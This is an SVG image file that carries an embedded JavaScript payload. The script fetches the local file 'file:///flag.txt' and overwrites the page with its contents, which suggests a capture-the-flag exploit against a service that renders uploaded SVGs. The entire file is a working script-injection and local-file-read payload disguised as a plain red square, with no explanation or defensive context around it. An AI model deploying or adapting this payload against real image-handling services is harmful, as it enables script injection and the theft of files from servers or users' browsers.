<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script type="text/javascript">
    fetch('file:///flag.txt')
      .then(response => response.text())
      .then(data => {
        document.body.innerHTML = data;
      });
  </script>
  <rect width="100" height="100" fill="red"/>
</svg> 